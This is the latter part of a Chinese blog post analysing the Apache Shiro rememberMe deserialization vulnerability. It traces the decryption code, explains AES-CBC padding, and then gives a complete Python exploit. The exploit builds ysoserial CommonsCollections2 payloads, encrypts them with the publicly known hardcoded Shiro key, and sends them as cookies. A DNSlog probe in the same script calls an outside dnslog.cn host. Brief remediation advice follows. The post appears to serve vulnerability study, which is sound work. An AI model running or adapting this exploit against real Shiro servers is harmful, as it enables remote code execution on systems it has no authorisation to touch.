            String msg <span class="token operator">=</span> <span class="token string">"Unable to correctly extract the Initialization Vector or ciphertext."</span><span class="token punctuation">;</span>
            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">CryptoException</span><span class="token punctuation">(</span>msg<span class="token punctuation">,</span> var8<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
  <span class="token comment">//进入下一层解密</span>
  <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">decrypt</span><span class="token punctuation">(</span>encrypted<span class="token punctuation">,</span> key<span class="token punctuation">,</span> iv<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
<p>追随到 JcaCipherService 的 decrypt 方法中，继续跟入 crypt 方法</p> 
<pre><code class="prism language-java"><span class="token keyword">private</span> ByteSource <span class="token function">decrypt</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> ciphertext<span class="token punctuation">,</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> key<span class="token punctuation">,</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> iv<span class="token punctuation">)</span> <span class="token keyword">throws</span> CryptoException <span class="token punctuation">{<!-- --></span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>log<span class="token punctuation">.</span><span class="token function">isTraceEnabled</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        log<span class="token punctuation">.</span><span class="token function">trace</span><span class="token punctuation">(</span><span class="token string">"Attempting to decrypt incoming byte array of length "</span> <span class="token operator">+</span> <span class="token punctuation">(</span>ciphertext <span class="token operator">!=</span> null <span class="token operator">?</span> ciphertext<span class="token punctuation">.</span>length <span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> decrypted <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">crypt</span><span class="token punctuation">(</span>ciphertext<span class="token punctuation">,</span> key<span class="token punctuation">,</span> iv<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> decrypted <span class="token operator">==</span> null <span class="token operator">?</span> null <span class="token operator">:</span> Util<span class="token punctuation">.</span><span class="token function">bytes</span><span class="token punctuation">(</span>decrypted<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
<p>跑到 JcaCipherService 中的 crypt 方法</p> 
<pre><code class="prism language-java"><span class="token keyword">private</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">crypt</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytes<span class="token punctuation">,</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> key<span class="token punctuation">,</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> iv<span class="token punctuation">,</span> <span class="token keyword">int</span> mode<span class="token punctuation">)</span> <span class="token keyword">throws</span> IllegalArgumentException<span class="token punctuation">,</span> CryptoException <span class="token punctuation">{<!-- --></span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>key <span class="token operator">!=</span> null <span class="token operator">&amp;&amp;</span> key<span class="token punctuation">.</span>length <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
      
   			<span class="token comment">//初始化cipher，再跟入就是 原生的 cipher.init 解密方法了</span>
        Cipher cipher <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">initNewCipher</span><span class="token punctuation">(</span>mode<span class="token punctuation">,</span> key<span class="token punctuation">,</span> iv<span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      	<span class="token comment">// 基本完成解密</span>
        <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">crypt</span><span class="token punctuation">(</span>cipher<span class="token punctuation">,</span> bytes<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">IllegalArgumentException</span><span class="token punctuation">(</span><span class="token string">"key argument cannot be null or empty."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> 
<h3><a id="_505"></a>解密完成，序列化操作</h3> 
<p>解密完成后，一步步的return回到上级函数，回到AbstractRememberMeManager 的 decrypt 方法，看一下数据 r00 开头 序列化的数据</p> 
<p><img src="https://images2.imgbox.com/af/d8/Lbc7u4VK_o.png" alt="image-20200902161947628"></p> 
<p>向上return，看到deserialize 反序列化的方法了</p> 
<p><img src="https://images2.imgbox.com/c7/8f/ReJUVCz5_o.png" alt="image-20200902162647497"></p> 
<p>一直跟进到 DefaultSerializer 的 deserialize方法中，见到了久违的 readObject（）方法</p> 
<p><img src="https://images2.imgbox.com/d8/1e/yv48MYxA_o.png" alt="image-20200902162819610"></p> 
<h2><a id="0x04_POC_EXP_521"></a>0x04 编写POC EXP</h2> 
<h3><a id="AES_525"></a>本次AES加密的一些小知识点：</h3> 
<ul><li>某些加密算法要求明文需要按一定长度对齐，叫做块大小(BlockSize)，我们这次就是16字节，那么对于一段任意的数据，加密前需要对最后一个块填充到16 字节，解密后需要删除掉填充的数据。</li><li>AES中有三种填充模式(PKCS7Padding/PKCS5Padding/ZeroPadding)</li><li>PKCS7Padding跟PKCS5Padding的区别就在于数据填充方式，PKCS7Padding是缺几个字节就补几个字节的0，而PKCS5Padding是缺几个字节就补充几个字节的几，好比缺6个字节，就补充6个字节的6</li></ul> 
<p>加密流程就是：</p> 
<ul><li> <p>使用的 AES/CBC/PKCS5Padding 模式</p> </li><li> <p>random = this.ensureSecureRandom(); 使用随机数生成 ivBytes</p> </li><li> <p>key为预留的那个硬编码</p> </li><li> <p>encrypt(plaintext, key, ivBytes, generate) 生成</p> </li><li> <p>最后base64加密，放入cookie中</p> </li></ul> 
<p>解密流程可以知道：</p> 
<ul><li> <p>使用的 AES/CBC/PKCS5Padding 模式 ，所以Key要求是为16位的，key为预留的那个硬编码</p> </li><li> <p>base64解密cookie 中 rememberMe的值</p> </li><li> <p>根据解密 vi 是 秘文的前16位</p> </li><li> <p>iv即为rememberMe解码后的前16个字节</p> </li><li> <p>有了key 和 vi 就可以解密到反序列化的数据了</p> </li></ul> 
<p>那POC的我们的加密流程就是：</p> 
<ol><li>获取到 反序列化的数据</li><li>设置AES加密模式，使用AES.MODE_CBC的分块模式</li><li>设置硬编码的 key</li><li>使用随机数生成 16 字节的 iv</li><li>使用 iv + AES加密(反序列化数据) 拼接</li><li>最后base64加密全部内容</li></ol> 
<h3><a id="_574"></a>利用思路</h3> 
<p>这里主要导入的是这个版本的apache.commons</p> 
<pre><code>&lt;groupId&gt;org.apache.commons&lt;/groupId&gt;
&lt;artifactId&gt;commons-collections4&lt;/artifactId&gt;
&lt;version&gt;4.0&lt;/version&gt;
</code></pre> 
<p>所以我们EXP利用CommonsCollections2 的利用链</p> 
<p>主要依靠ysoserial生成利用的反序列化数据，然后根据加密的思路，把利用链加进去。</p> 
<h3><a id="Python_592"></a>Python代码</h3> 
<pre><code class="prism language-python"><span class="token keyword">import</span> base64
<span class="token keyword">import</span> sys
<span class="token keyword">import</span> uuid
<span class="token keyword">import</span> subprocess

<span class="token keyword">import</span> requests
<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> AES


<span class="token keyword">def</span> <span class="token function">encode_rememberme</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># 这里使用CommonsCollections2模块</span>
    popen <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>Popen<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'java'</span><span class="token punctuation">,</span> <span class="token string">'-jar'</span><span class="token punctuation">,</span> <span class="token string">'ysoserial.jar'</span><span class="token punctuation">,</span> <span class="token string">'CommonsCollections2'</span><span class="token punctuation">,</span> command<span class="token punctuation">]</span><span class="token punctuation">,</span> stdout<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">)</span>

    <span class="token comment"># 明文需要按一定长度对齐，叫做块大小BlockSize 这个块大小是 block_size = 16 字节</span>
    BS <span class="token operator">=</span> AES<span class="token punctuation">.</span>block_size

    <span class="token comment"># 按照加密规则按一定长度对齐,如果不够要要做填充对齐</span>
    pad <span class="token operator">=</span> <span class="token keyword">lambda</span> s<span class="token punctuation">:</span> s <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>BS <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">%</span> BS<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>BS <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">%</span> BS<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>

    <span class="token comment"># 泄露的key</span>
    key <span class="token operator">=</span> <span class="token string">"kPH+bIxk5D2deZiIxcaaaA=="</span>

    <span class="token comment"># AES的CBC加密模式</span>
    mode <span class="token operator">=</span> AES<span class="token punctuation">.</span>MODE_CBC

    <span class="token comment"># 使用uuid4基于随机数模块生成16字节的 iv向量</span>
    iv <span class="token operator">=</span> uuid<span class="token punctuation">.</span>uuid4<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">bytes</span>

    <span class="token comment"># 实例化一个加密方式为上述的对象</span>
    encryptor <span class="token operator">=</span> AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">,</span> mode<span class="token punctuation">,</span> iv<span class="token punctuation">)</span>

    <span class="token comment"># 用pad函数去处理yso的命令输出，生成的序列化数据</span>
    file_body <span class="token operator">=</span> pad<span class="token punctuation">(</span>popen<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token comment"># iv 与 （序列化的AES加密后的数据）拼接， 最终输出生成rememberMe参数</span>
    base64_rememberMe_value <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>iv <span class="token operator">+</span> encryptor<span class="token punctuation">.</span>encrypt<span class="token punctuation">(</span>file_body<span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token keyword">return</span> base64_rememberMe_value


<span class="token keyword">def</span> <span class="token function">dnslog</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">:</span>
    popen <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>Popen<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'java'</span><span class="token punctuation">,</span> <span class="token string">'-jar'</span><span class="token punctuation">,</span> <span class="token string">'ysoserial.jar'</span><span class="token punctuation">,</span> <span class="token string">'URLDNS'</span><span class="token punctuation">,</span> command<span class="token punctuation">]</span><span class="token punctuation">,</span> stdout<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">)</span>
    BS <span class="token operator">=</span> AES<span class="token punctuation">.</span>block_size
    pad <span class="token operator">=</span> <span class="token keyword">lambda</span> s<span class="token punctuation">:</span> s <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>BS <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">%</span> BS<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>BS <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">%</span> BS<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>
    key <span class="token operator">=</span> <span class="token string">"kPH+bIxk5D2deZiIxcaaaA=="</span>
    mode <span class="token operator">=</span> AES<span class="token punctuation">.</span>MODE_CBC
    iv <span class="token operator">=</span> uuid<span class="token punctuation">.</span>uuid4<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token builtin">bytes</span>
    encryptor <span class="token operator">=</span> AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">,</span> mode<span class="token punctuation">,</span> iv<span class="token punctuation">)</span>
    file_body <span class="token operator">=</span> pad<span class="token punctuation">(</span>popen<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    base64_rememberMe_value <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>iv <span class="token operator">+</span> encryptor<span class="token punctuation">.</span>encrypt<span class="token punctuation">(</span>file_body<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> base64_rememberMe_value


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    <span class="token comment"># cc2的exp</span>
    payload <span class="token operator">=</span> encode_rememberme<span class="token punctuation">(</span><span class="token string">'/System/Applications/Calculator.app/Contents/MacOS/Calculator'</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"rememberMe={}"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>payload<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token comment"># dnslog的poc</span>
    payload1 <span class="token operator">=</span> encode_rememberme<span class="token punctuation">(</span><span class="token string">'http://ca4qki.dnslog.cn/'</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"rememberMe={}"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>payload1<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

    cookie <span class="token operator">=</span> <span class="token punctuation">{<!-- --></span>
        <span class="token string">"rememberMe"</span><span class="token punctuation">:</span> payload<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">}</span>

    requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span><span class="token string">"http://127.0.0.1:8080/web_war/"</span><span class="token punctuation">,</span> cookies<span class="token operator">=</span>cookie<span class="token punctuation">)</span>

</code></pre> 
<h2><a id="0x05__667"></a>0x05 修复</h2> 
<p>1.升级Shiro到最新版</p> 
<p>2.升级对应JDK版本到 8u191/7u201/6u211/11.0.1 以上</p> 
<p>3.WAF拦截Cookie中长度过大的rememberMe值</p> 
<h2><a id="0x06__677"></a>0x06 总结</h2> 
<p>本次是用ysoserial直接生成序列化内容，而且使用CommonsCollections2这个利用链，只是简单的直接利用，但是实际利用情况十分复杂，关乎java的版本还有各种组件的版本，想要一个完美的利用链还是得自己改造，准备下一篇文章，再研究各种利用链的情况，和改造各种利用链适配问题。</p> 
<h2><a id="0x07_trips_685"></a>0x07 小trips：</h2> 
<p>如何搜索lib包里面的东西呢？</p> 
<p><img src="https://images2.imgbox.com/b2/36/wp2SssB0_o.png" alt="image-20200902091323860"></p> 
<p>双击shift , 调出全局搜索框就可以搜索到 jar包里的类了</p>
                </div>
		</div>
		<div id="gabottom"></div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/2a20f36f38a730ee1ca857aae2ab2878/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">C# 中 窗口设置尺寸与运行时尺寸不一样</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/a3ea56fc138f2d93d396f840e0147fb1/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">ClickHouse节点扩容及数据迁移</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 老帅的博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://www.w3counter.com/tracker.js?id=151347"></script>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>